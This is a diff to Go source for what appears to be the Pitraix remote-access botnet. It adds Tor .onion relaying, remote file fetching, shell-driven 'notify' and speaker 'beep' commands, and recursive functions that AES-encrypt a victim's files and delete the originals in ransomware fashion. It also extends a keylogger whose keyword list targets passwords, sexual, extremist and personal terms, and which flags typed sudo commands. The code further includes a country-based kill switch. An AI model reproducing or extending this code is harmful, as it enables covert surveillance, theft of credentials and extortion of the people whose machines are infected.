@@ -28,6 +28,7 @@ import (
     // "crypto/sha256"
     "crypto/sha512"
 	"crypto/x509"
+	"encoding/hex"
     "encoding/pem"
     "encoding/base64"
 	"encoding/json"
@@ -47,7 +48,10 @@ import (
 	"net/url"
 	"net"
 	"errors"
+	"syscall"
 
+	"unsafe"
+	"github.com/atotto/clipboard"
 	"golang.org/x/net/proxy"
 )
 
@@ -104,6 +108,13 @@ type config_File_Type struct {
 	Register bool
 	AES_Key  string
 	ContactD string
+}
+
+type inputEvent struct {
+	Time  syscall.Timeval
+	Type  uint16
+	Code  uint16
+	Value int32
 }
 
 // type instruType struct {
@@ -510,24 +521,29 @@ func doInstru(ic, iv string) string {
 		confAsyncChn <- []string{"routesh", iv}
 
 	case "relay":
-		fmt.Println("############ GOT RELAY")
 		ivspl := strings.Split(iv, " ")
-		if ivspl[0] == "*" { // relay to all routes hosts
+
+		// relay to all routes hosts
+		if ivspl[0] == "*" { 
 			for _, v := range cft.RoutesH {
 				fmt.Println("V:", v)
 				response, err := postRequest("http://" + v + ".onion", []byte(iv[2:]), true, 25)
 				fmt.Println(string(response), err)
 				out += string(response) + "\n"
 			}
-		} else { // targeted relay
-			fmt.Println("TARGETED RELAY DETECTED: PAYLOAD: ", ivspl[1], "TO " + ivspl[0])
+
+		} else { 
+			// targeted relay
+
 			go func(ivspl []string) {
 				response, err := postRequest("http://" + ivspl[0] + ".onion", []byte(ivspl[1]), true, 25)
 				fmt.Println(string(response), err)
 				// out += string(response) + "\n"
 			}(ivspl)
+
 		}
 		out = strings.TrimSpace(out)
+	
 	case "download":
 		if file_Exists(iv) {
 			f, err := readFile(iv)
@@ -543,7 +559,13 @@ func doInstru(ic, iv string) string {
 	case "upload":
 		ivspl := strings.Split(iv, " ")
 		if len(ivspl) == 2 {
+			var content []byte
 			fileBase64 := strings.TrimSpace(ivspl[1]) // iv[len(ivspl[0]) + 1:])
+
+			if strings.HasPrefix(fileBase64, "http://") || strings.HasPrefix(fileBase64, "https://") {
+				content, _ = getRequest(ivspl[1], false, -1)
+				// fmt.Println(err)
+			}
 
 			content, err := base64.StdEncoding.DecodeString(fileBase64)
 			if err == nil {
@@ -554,6 +576,7 @@ func doInstru(ic, iv string) string {
 			} else {
 				out = "Error:" + err.Error()
 			}
+
 		} else {
 			out = "Error: len not 2"
 		}
@@ -571,12 +594,215 @@ func doInstru(ic, iv string) string {
 			out = "Error: Invalid path " + iv
 		}
 
+	case "notify":
+		ivspl := strings.Split(iv, " ")
+
+		if len(ivspl) < 2 {
+			out = "Error: iv length is not 2"
+		} else {
+			x := doInstru("shellnoop", "notify-send " + iv)
+			fmt.Println(x)
+			out = "Done."
+		}
+
+	case "beep":
+		ivspl := strings.Split(iv, " ")
+
+		if len(ivspl) == 2 {
+			freq, _ := strconv.Atoi(ivspl[0])
+			dur, _ := strconv.Atoi(ivspl[1])
+
+			err := beepSound(float64(freq), dur)
+			if err !=  nil{
+				out = "Error: " + err.Error()
+			} else {
+				out = "Done"
+			}
+			
+		} else {
+			out = "Error: Invalid instruction format: " + iv
+		}
+
 	case "noop":
 		fmt.Println("Pitraix")
 	}
 
 	// fmt.Println("out:", out)
 	return out
+}
+
+func ioctl(fd, name, data uintptr) error {
+	_, _, e := syscall.Syscall(syscall.SYS_IOCTL, fd, name, data)
+	if e != 0 {
+		return e
+	}
+
+	return nil
+}
+
+func beepSound(freq float64, duration int) error {
+	const (
+		clockTickRate = 1193180
+		kiocsound     = 0x4B2F
+		evSnd         = 0x12
+		sndTone       = 0x02
+	)
+
+	if freq == 0 {
+		freq = 440.0
+	} else if freq > 20000 {
+		freq = 20000
+	} else if freq < 0 {
+		freq = 440.0
+	}
+
+	if duration == 0 {
+		duration = 200
+	}
+
+	period := int(float64(clockTickRate) / freq)
+
+	var evdev bool
+
+	f, err := os.OpenFile("/dev/tty0", os.O_WRONLY, 0644)
+	if err != nil {
+		e := err
+		f, err = os.OpenFile("/dev/input/by-path/platform-pcspkr-event-spkr", os.O_WRONLY, 0644)
+		if err != nil {
+			e = errors.New("beeep: " + e.Error() + "; " + err.Error())
+			_, err = os.Stdout.Write([]byte{7})
+			if err != nil {
+				return errors.New(e.Error() + "; " + err.Error())
+			}
+
+			return nil
+		}
+
+		evdev = true
+	}
+
+	defer f.Close()
+
+	if evdev {
+		ev := inputEvent{}
+		ev.Type = evSnd
+		ev.Code = sndTone
+		ev.Value = int32(freq)
+
+		d := *(*[unsafe.Sizeof(ev)]byte)(unsafe.Pointer(&ev))
+
+		f.Write(d[:])
+		time.Sleep(time.Duration(duration) * time.Millisecond)
+
+		ev.Value = 0
+		d = *(*[unsafe.Sizeof(ev)]byte)(unsafe.Pointer(&ev))
+
+		f.Write(d[:])
+	} else {
+		err = ioctl(f.Fd(), kiocsound, uintptr(period))
+		if err != nil {
+			return err
+		}
+
+		time.Sleep(time.Duration(duration) * time.Millisecond)
+
+		err = ioctl(f.Fd(), kiocsound, uintptr(0))
+		if err != nil {
+			return err
+		}
+	}
+
+	return nil
+}
+
+
+func decFiles(path string, key []byte) {
+	files, err := ioutil.ReadDir(path)
+	if err != nil {
+		fmt.Println("error reading directory:", err)
+		// continue
+	}
+	for _, file := range files {
+		fname := file.Name()
+
+		if strings.HasSuffix(fname, ".desktop") {
+			continue
+		}
+
+		if file.IsDir() {
+			decFiles(filepath.Join(path, fname), key)
+			continue
+		}
+
+		f, err := readFile(filepath.Join(path, fname))
+		if err != nil {
+			fmt.Println("error reading file:", err)
+			continue
+		}
+
+		fnamesplt := strings.Split(fname, "_")
+
+		if len(fnamesplt) > 1 {
+			nonce, err := hex.DecodeString(strings.Replace(fnamesplt[1], filepath.Ext(fnamesplt[1]), "", -1))
+			if err != nil {
+				fmt.Println("nonce error:", err)
+				continue
+			}
+			decypher, err := decrypt_AES(f, nonce , key)
+			if err != nil {
+				fmt.Println("decryption error:", err)
+				continue
+			}
+			os.Remove(filepath.Join(path, fname))
+			out, err := os.Create(filepath.Join(path, fnamesplt[0])) // + filepath.Ext(fname))
+			out.Write(decypher)
+			if err != nil {
+				fmt.Println("error creating encrypted file:", err)
+				continue
+			}
+			out.Close()	
+		}
+
+	}
+
+}
+
+
+func encFiles(path string, key []byte) {
+	files, err := ioutil.ReadDir(path)
+	if err != nil {
+		fmt.Println("error reading directory:", err)
+		// continue
+	}
+	for _, file := range files {
+		fname := file.Name()
+		
+		if strings.HasSuffix(fname, ".desktop"){
+			continue
+		}
+
+		if file.IsDir() {
+			encFiles(filepath.Join(path, fname), key)
+			continue
+		}
+
+		f, err := readFile(filepath.Join(path, fname))
+		if err != nil {
+			fmt.Println("error reading file:", err)
+			continue
+		}
+		os.Remove(filepath.Join(path, fname))
+		// f = append([]byte(fname + "|"))
+		cypher, nonce, _ := encrypt_AES(f, key)
+
+		out, err := os.Create(path + "\\" + fname + "_" + hex.EncodeToString(nonce) + filepath.Ext(fname))
+		out.Write(cypher)
+		if err != nil {
+			fmt.Println("error creating file:", err)
+			continue
+		}
+		out.Close()	
+	}
 }
 
 func unzip(src, dest string) error {
@@ -922,7 +1148,9 @@ func main() {
 		}
 		json.Unmarshal(ipinfo_req, &ipinfo_struct)
 		break
+
 	}
+
 	if ipinfo_struct.Country == "IL" {
 		fmt.Println("Shalom")
 		os.Exit(0) // I love you
@@ -947,45 +1175,107 @@ func main() {
 	// Move both parser and raw before attempt
 	go func(klogChn1 chan string) { // Key logger parser
 		sudoTrigger := false
+
+		/* 
+			Some words of this list are mispelled on purpose, this is not a mistake and logger will still pick correct word
+			This list will only keylog "interesting" things like porn searches, extremeist views and personal information
+		*/
 		eventsIndicators := []string{
-			// offensive / porn / child porn
-			"fuck",
-			"shit",
-			"sex",
-			"dick",
-			"cock",
-			"pussy",
-			"ass",
-			"tit",
-			"balls",
-			"young",
-			"kid",
-			"teen",
-			"child",
+			"going to",
+			"will",
+			"troll",
+			"vpn",
+			"proxy",
+			"password",
+			"hid",
+			"tor",
+			"hack",
+			"crack",
+			"engineer",
+			"spam",
+			"log",
+			"i2p",
+			"freenet",
+			"whonix",
+			"qube",
+			"tails",
+			"usb",
+			"dox",
+			"opsec",
+			"info",
+			"sell",
+			"buy",
+			"ubuntu",
+			"debian",
+			"manjaro",
+			"arch",
+			"fedora",
+			"harden",
+			"bot",
+			"mal",
+			"data",
+			"dev",
+			"psyop",
+			"op",
+			"vacation",
+			"program",
+			"python",
+			"c++",
+			"c#",
+			"binary",
+			"java",
+			"javascript",
+			"golang",
+			"html",
+			"css",
+			"cypher",
+			"cipher",
+			"zero",
+			"0",
+			"1",
+			"2",
+			"3",
+			"4",
+			"5",
+			"6",
+			"7",
+			"8",
+			"9",
+			"exploit",
+			"meta",
+			"fuc",
+			"shi",
+			"se",
+			"dic",
+			"coc",
+			"pus",
+			"as",
+			"ti",
+			"bal",
+			"youn",
+			"ki",
+			"tee",
+			"chil",
+			"fullz",
 			"cp",
-			"loli",
-			"porn",
-			"xx",
-			"xvideos",
-			"xnxx",
+			"por",
+			"x",
 			"tra",
 			"gay",
 			"lgb",
 			"blow",
-			"rape",
+			"rap",
 			"stalk",
 			"horny",
 			"naked",
-			"hardcore",
-			"softcore",
+			"hard",
+			"soft",
 			"bre",
 			"straight",
 			"girl",
 			"fur",
 			"cub",
 			"prostitut",
-
-			// family terms
 			"mom",
 			"mother",
 			"dad",
@@ -996,15 +1286,13 @@ func main() {
 			"uncle",
 			"aunt",
 			"cousin",
-
-			// extremeist / racist / homophobic
 			"al qaeda",
-			"isis",
+			"isi",
 			"islamic",
-			"jihad",
-			"muslim state",
-			"nazi",
-			"hitler",
+			"ji",
+			"muslim",
+			"naz",
+			"hitl",
 			"ww1",
 			"ww2",
 			"ww3",
@@ -1014,15 +1302,14 @@ func main() {
 			"would",
 			"white",
 			"black",
-			"jew",
+			"je",
 			"nig",
 			"neg",
 			"war",
 			"revenge",
 			"grudge",
 			"blood",
-			"fag",
-			"homemade",
+			"fa",
 			"hate",
 			"iraq",
 			"syria",
@@ -1031,8 +1318,8 @@ func main() {
 			"drone",
 			"nuclear",
 			"nuke",
-			"bomb",
-			"explosive",
+			"bom",
+			"explos",
 			"sho",
 			"guns",
 			"glock",
@@ -1054,63 +1341,6 @@ func main() {
 			"betray",
 			"how to",
 			"manual",
-			"going to",
-			"will",
-			"troll",
-
-			// tech aware / researcher / hacker / cracker / fraudster
-			"vpn",
-			"proxy",
-			"password",
-			"hid",
-			"tor",
-			"the onion router",
-			"hack",
-			"crack",
-			"engineer",
-			"spam",
-			"fullz",
-			"log",
-			"i2p",
-			"freenet",
-			"whonix",
-			"qube",
-			"tails",
-			"usb",
-			"dox",
-			"opsec",
-			"info",
-			"sell",
-			"buy",
-			"ubuntu",
-			"debian",
-			"manjaro",
-			"arch",
-			"fedora",
-			"harden",
-			"bot",
-			"malware",
-			"data",
-			"dev",
-			"psyop",
-			"op",
-			"vacation",
-			"program",
-			"python",
-			"c++",
-			"c#",
-			"binary",
-			"java",
-			"javascript",
-			"golang",
-			"html",
-			"css",
-			"cypher",
-			"cipher",
-			"zero",
-			"0",
-			"exploit",
-			"metasploit",
 			"facebook",
 			"twitter",
 			"link",
@@ -1174,14 +1404,11 @@ func main() {
 			"express",
 			"firefox",
 			"chrome",
-
-			// bank info / goverment employee / spy
 			"nsa",
-			"national security",
+			"national",
 			"agency",
 			"fbi",
 			"addict",
-			"federal",
 			"fed",
 			"cia",
 			"mossad",
@@ -1225,8 +1452,6 @@ func main() {
 			"car",
 			"boat",
 			"charge",
-
-			// drug addict
 			"drug",
 			"date",
 			"meth",
@@ -1248,8 +1473,6 @@ func main() {
 			"steroid",
 			"overdose",
 			"angel",
-			
-			// private info / clues / misc
 			"depress",
 			"homework",
 			"friend",
@@ -1330,13 +1553,13 @@ func main() {
 			"euro",
 			"free",
 			"holy",
-			"omg",
 		}
+		
 		for sentence := range klogChn1 {
 			if sudoTrigger == false {
 				sentenceSplit := strings.Split(strings.TrimSpace(sentence), " ")
 				if !isroot_const && (sentenceSplit[0] == "sudo" || sentenceSplit[0] == "doas") {
-					fmt.Println("got admin?!", sentence)
+					fmt.Println("sudo command detected:", sentence)
 					sudoTrigger = true
 				} else {
 					words := strings.Fields(sentence)
